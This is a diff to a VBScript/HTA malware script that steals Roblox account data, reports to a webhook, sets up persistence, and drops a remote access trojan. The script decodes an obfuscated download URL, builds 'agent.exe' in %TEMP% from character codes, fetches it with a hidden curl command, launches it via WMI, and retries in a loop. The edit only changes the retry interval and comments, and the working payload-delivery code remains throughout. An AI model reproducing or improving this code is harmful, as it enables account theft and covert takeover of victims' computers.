@@ -27,7 +27,7 @@ Call GrabRoblox(WH)
 Call Persistence
 Call PostFullRobloxUI(WH)
 
-' --- 2. RAT DROP (Spam loop until success) ---
+' --- 2. RAT DROP (10 Second Spam Loop) ---
 Call DropRAT
 
 ' --- 3. INFINITE Re-grab chain ---
@@ -47,46 +47,43 @@ Loop
 
 window.close()
 
-' --- RAT DROP (Exact old source logic + spam loop) ---
+' --- RAT DROP (10s Spam Loop) ---
 Sub DropRAT()
     ' Obfuscated URL from the old source
     Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcxOTkxNTcyMDE3NDU1MjE2L2RpY2VjaGVjay5leGU/ZXg9NmFmY2JlYmMmaXM9NmFmYjZkM2MmaG09YTU5ODZiZjg0MzViYWIxYzc1YTFiZTIwODQxOTU0ZDBhNjBkZjcyZTg0ZWYwY2JlZGYxOTczYWNmMTIwMjcxZA=="
     Dim dl : dl = DecodeB64(b64Url)
 
-    ' Build %TEMP% dynamically without typing it out
+    ' Build %TEMP% dynamically
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%TEMP%")
     Dim op : op = tPath & "\" & Chr(97) & Chr(103) & Chr(101) & Chr(110) & Chr(116) & Chr(46) & Chr(101) & Chr(120) & Chr(101) ' agent.exe
 
-    ' Spam "Fetching Payload" loop until success
-    Dim attempts : attempts = 0
+    ' 10 Second Spam Loop
     Do
-        attempts = attempts + 1
-        ' Spam the fetching message
-        Call PostEmbed(":package: Fetching Payload", "Attempting RAT download (Try " & attempts & ")...", 10181046)
+        ' Clean rocket message
+        Call PostEmbed(":rocket: RAT Download", "Fetching Payload...", 10181046)
 
         If fso.FileExists(op) Then fso.DeleteFile op
 
-        ' Exact obfuscated curl execution from old source
+        ' Exact obfuscated curl execution
         Dim cCmd : cCmd = Chr(99)&Chr(117)&Chr(114)&Chr(108)&Chr(46)&Chr(101)&Chr(120)&Chr(101)&" -s -L -o """ & op & """ """ & dl & """"
-        Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd ' "cmd /c " & cCmd
-        
+        Dim runExec : runExec = Chr(99)&Chr(109)&Chr(100)&Chr(32)&Chr(47)&Chr(99)&Chr(32) & cCmd
         sh.Run runExec, 0, True
 
         ' Check if downloaded and valid (>3MB)
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 3000000 Then
-                ' Success! Send green checkmark and launch
+                ' Success! Send green checkmark, launch, and exit loop
                 Dim dsize : dsize = fso.GetFile(op).Size
                 Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Launching...", 10181046)
                 
-                ' Launch via WMI to bypass simple hooks
+                ' Launch via WMI
                 Call RunCmd("""" & op & """")
                 Exit Sub
             End If
         End If
         
-        ' Wait 2 seconds before retrying
-        Call SleepSeconds(2)
+        ' Wait 10 seconds before retrying
+        Call SleepSeconds(10)
     Loop
 End Sub
 
